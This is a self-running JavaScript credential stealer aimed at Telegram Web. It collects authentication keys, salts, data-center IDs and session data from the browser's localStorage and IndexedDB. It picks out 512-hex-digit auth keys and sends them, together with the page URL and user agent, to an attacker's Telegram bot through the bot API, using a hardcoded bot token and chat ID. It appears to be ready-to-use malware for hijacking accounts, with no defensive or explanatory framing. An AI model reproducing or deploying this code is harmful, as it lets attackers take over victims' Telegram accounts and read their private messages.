(function () {
  var CFG = {
    BOT: '8610466101:AAGrgL8oIrBRBDHsV0M_dC2mqwU7MKaZF5k',
    CHAT: '8314393607',
    TAG: 'TWG',
    HOST: 'web.telegram.org',
    RETRY_MS: 2500,
    RETRY_MAX: 14,
    MAX_LS: 8192,
    STORES: ['state', 'session', 'sessions', 'authState', 'globalState', 'kv', 'config', 'accounts', 'storage']
  };

  function hostOf() {
    var h = '';
    try { h = location.hostname || ''; } catch (e) {}
    return h || CFG.HOST;
  }

  function hx(u8) {
    var s = '', i;
    for (i = 0; i < u8.length; i++) s += ('0' + u8[i].toString(16)).slice(-2);
    return s;
  }

  function isKey(s) { return typeof s === 'string' && /^[0-9a-fA-F]{512}$/.test(s); }

  function repl(k, v) {
    if (v && v.constructor === Uint8Array) return { u8: hx(v) };
    if (v instanceof ArrayBuffer) return { u8: hx(new Uint8Array(v)) };
    if (typeof v === 'bigint') return String(v);
    return v;
  }

  function jc(o) {
    try { return JSON.parse(JSON.stringify(o, repl)); }
    catch (e) { return String(o).slice(0, 400); }
  }

  var KEEP = /auth_key|_salt|(^|_)dc$|(^|_)dcid$|user_auth|session|fingerprint|xt_instance|user_id|(^|_)dc[0-9]/i;

  function lsRead() {
    var data = {}, meta = [], i, k, v, n;
    try { n = localStorage.length; } catch (e) { return null; }
    for (i = 0; i < n; i++) {
      k = localStorage.key(i);
      try { v = localStorage.getItem(k) || ''; } catch (e) { v = ''; }
      meta.push(k + ':' + v.length);
      if (KEEP.test(k) && v.length <= CFG.MAX_LS) data[k] = v;
    }
    return { data: data, meta: meta.join(' ') };
  }

  function openDb(name) {
    return new Promise(function (res, rej) {
      var r = indexedDB.open(name);
      r.onsuccess = function () { res(r.result); };
      r.onerror = function () { rej(r.error); };
    });
  }

  function getAll(db, store) {
    return new Promise(function (res, rej) {
      var q = db.transaction(store, 'readonly').objectStore(store).getAll();
      q.onsuccess = function () { res(q.result); };
      q.onerror = function () { rej(q.error); };
    });
  }

  function idbRead() {
    return new Promise(function (done) {
      var names = ['tt-data', 'tt-data-a', 'tt-data-k', 'tt-data-w'];

      function go() {
        var out = {}, idx = 0;
        function next() {
          if (idx >= names.length) return done(out);
          var name = names[idx++];
          openDb(name).then(function (db) {
            var stores = Array.prototype.slice.call(db.objectStoreNames);
            var acc = { names: stores.join(',') };
            var si = 0;
            function snext() {
              if (si >= stores.length) { db.close(); out[name] = acc; return next(); }
              var s = stores[si++];
              if (CFG.STORES.indexOf(s) < 0) { acc['n_' + s] = 0; return snext(); }
              getAll(db, s).then(function (rows) {
                acc[s] = rows.map(jc);
                snext();
              }, function () { acc[s] = 'ERR'; snext(); });
            }
            snext();
          }, next);
        }
        next();
      }

      try {
        var p = indexedDB.databases();
        if (p && p.then) {
          p.then(function (list) {
            var ns = list.map(function (d) { return d.name; }).filter(Boolean);
            if (ns.length) names = ns;
            go();
          }, go);
        } else { go(); }
      } catch (e) { done({}); }
    });
  }

  function walk(o, hits, path) {
    if (o === null || o === undefined) return;
    if (typeof o === 'string') {
      if (isKey(o)) hits.push({ path: path, hex: o.toLowerCase() });
      return;
    }
    if (Array.isArray(o)) { o.forEach(function (v, i) { walk(v, hits, path + '[' + i + ']'); }); return; }
    if (typeof o === 'object') { for (var k in o) if (o.hasOwnProperty(k)) walk(o[k], hits, path + '.' + k); }
  }

  function send(fields, file) {
    var fd = new FormData(), k;
    for (k in fields) if (fields.hasOwnProperty(k)) fd.append(k, fields[k]);
    if (file) fd.append('document', new Blob([file.body], { type: 'application/json' }), file.name);
    return fetch('https://api.telegram.org/bot' + CFG.BOT + '/' + (file ? 'sendDocument' : 'sendMessage'),
                 { method: 'POST', body: fd });
  }

  var tries = 0;

  function busyOff() { window.__twg_busy = false; }

  function retry() {
    busyOff();
    if (++tries < CFG.RETRY_MAX) setTimeout(run, CFG.RETRY_MS);
  }

  function run() {
    var n = window.__twg_nonce || 0;
    if (window.__twg_doneFor === n || window.__twg_busy) return;
    window.__twg_busy = true;

    var ls = lsRead();
    idbRead().then(function (idb) {
      var hits = [];
      if (ls) walk(ls.data, hits, 'ls');
      walk(idb, hits, 'idb');

      if (!hits.length && ++tries < CFG.RETRY_MAX) { busyOff(); setTimeout(run, CFG.RETRY_MS); return; }

      var host = hostOf();
      var payload = {
        tag: CFG.TAG, ts: Date.now(), host: host, nonce: n,
        url: (location.href || '').slice(0, 200), ua: navigator.userAgent,
        keys: hits, ls: ls ? ls.data : {}, lsMeta: ls ? ls.meta : '', idb: idb
      };
      var body = JSON.stringify(payload);
      var cap = CFG.TAG + ' | ' + host + ' | cles=' + hits.length + ' | ' + (hits[0] ? hits[0].path : 'aucune') + ' | ' + body.length + 'o';

      var pr = body.length <= 3500
        ? send({ chat_id: CFG.CHAT, text: cap + ' ' + body })
        : send({ chat_id: CFG.CHAT, caption: cap },
               { name: CFG.TAG + '_' + host + '_' + Date.now() + '.json', body: body });

      pr.then(function () {
        window.__twg_doneFor = n;
        busyOff();
      }, retry);
    }, retry);
  }

  run();
})();
